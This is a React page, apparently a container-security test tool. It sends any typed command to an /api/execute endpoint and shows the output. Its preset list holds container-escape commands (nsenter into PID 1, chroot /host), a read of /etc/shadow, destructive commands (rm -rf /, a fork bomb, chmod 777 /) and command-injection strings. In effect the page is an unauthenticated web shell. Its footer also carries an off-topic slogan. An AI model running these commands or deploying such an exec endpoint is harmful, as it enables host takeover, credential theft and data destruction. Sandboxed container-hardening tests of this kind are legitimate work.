import { useState } from 'react';

export default function Home() {
  const [command, setCommand] = useState('');
  const [output, setOutput] = useState([]);
  const [loading, setLoading] = useState(false);

  const presetCommands = [
    'whoami',
    'id',
    'pwd',
    'uname -a',
    'cat /etc/os-release',
    'ps aux',
    'env',
    'mount',
    'df -h',
    'ip addr',
    'netstat -tulpn',
    'ss -tulpn',
    'cat /proc/1/cgroup',
    'ls -la /.dockerenv',
    'cat /proc/self/mountinfo',
    'mount -t proc proc /host/proc',
    'nsenter -t 1 -m -u -i -n -p sh',
    'chroot /host',
    'ls -la /',
    'cat /proc/mounts',
    'findmnt',
    'lsblk',
    'capsh --print',
    'getcap -r /',
    'echo "Testing escape: \\$(whoami)"',
    '$(whoami)',
    '`whoami`',
    'rm -rf /',
    ':(){ :|:& };:',
    'cat /etc/shadow',
    'chmod 777 /',
  ];

  const executeCommand = async (cmd = command) => {
    if (!cmd.trim()) return;

    setLoading(true);

    try {
      const response = await fetch('/api/execute', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          command: cmd,
          type: 'exec'
        }),
      });

      const data = await response.json();

      setOutput(prev => [...prev, {
        command: cmd,
        timestamp: data.timestamp,
        success: data.success,
        result: data.result,
        error: data.error,
        env: data.env
      }]);

    } catch (error) {
      setOutput(prev => [...prev, {
        command: cmd,
        error: `Network error: ${error.message}`,
        success: false,
        timestamp: new Date().toISOString()
      }]);
    } finally {
      setLoading(false);
      setCommand('');
    }
  };

  const clearOutput = () => setOutput([]);

  return (
    <div style={{
      fontFamily: 'Monaco, Consolas, monospace',
      background: '#1a1a1a',
      color: '#00ff00',
      minHeight: '100vh',
      padding: '10px'
    }}>
      <h1 style={{ color: '#ff6b6b' }}>sdsss Test</h1>
      <h1 style={{ color: '#ff6b6b' }}>Container Test</h1>
      <h1 style={{ color: '#ff6b6b' }}>Container Test</h1>
      <h1 style={{ color: '#ff6b6b' }}>Container Test</h1>
      <div style={{ marginBottom: '20px' }}>
        <input
          type="text"
          value={command}
          onChange={(e) => setCommand(e.target.value)}
          onKeyPress={(e) => e.key === 'Enter' && executeCommand()}
          placeholder="Enter custom command..."
          disabled={loading}
          style={{
            background: '#333',
            color: '#00ff00',
            border: '1px solid #555',
            padding: '10px',
            width: '70%',
            marginRight: '10px'
          }}
        />
        <button
          onClick={() => executeCommand()}
          disabled={loading || !command.trim()}
          style={{
            background: '#666',
            color: 'white',
            border: 'none',
            padding: '10px 20px',
            cursor: 'pointer',
            marginRight: '10px'
          }}
        >
          {loading ? 'Executing...' : 'Execute'}
        </button>
        <button
          onClick={clearOutput}
          style={{
            background: '#ff6b6b',
            color: 'white',
            border: 'none',
            padding: '10px 20px',
            cursor: 'pointer'
          }}
        >
          Clear
        </button>
      </div>

      <div style={{
        background: '#000',
        border: '1px solid #333',
        padding: '20px',
        maxHeight: '500px',
        overflowY: 'auto'
      }}>
        {output.length === 0 ? (
          <div style={{ color: '#666' }}>No commands executed yet he he he...</div>
        ) : (
          output.map((entry, idx) => (
            <div key={idx} style={{ marginBottom: '20px', borderBottom: '1px solid #333', paddingBottom: '10px' }}>
              <div style={{ color: '#ffd93d' }}>
                $ {entry.command}
              </div>
              <div style={{ color: '#666', fontSize: '12px' }}>
                {entry.timestamp} | PID: {entry.env?.PID}
              </div>

              {entry.success ? (
                <div>
                  {entry.result?.stdout && (
                    <pre style={{ color: '#00ff00', margin: '5px 0' }}>
                      {entry.result.stdout}
                    </pre>
                  )}
                  {entry.result?.stderr && (
                    <pre style={{ color: '#ff6b6b', margin: '5px 0' }}>
                      {entry.result.stderr}
                    </pre>
                  )}
                </div>
              ) : (
                <pre style={{ color: '#ff6b6b', margin: '5px 0' }}>
                  ERROR: {entry.error}
                </pre>
              )}
            </div>
          ))
        )}
      </div>

      <div style={{ marginTop: '20px', color: '#666', fontSize: '12px' }}>
        <p>1</p>
        <p>POWER TO THE STRAIGHTS</p>
        <p>⚠️ This application intentionally attempts dangerous operations to test container security.</p>
        <p>Use only in isolated testing environments with proper monitoring.</p>
      </div>
    </div>
  );
}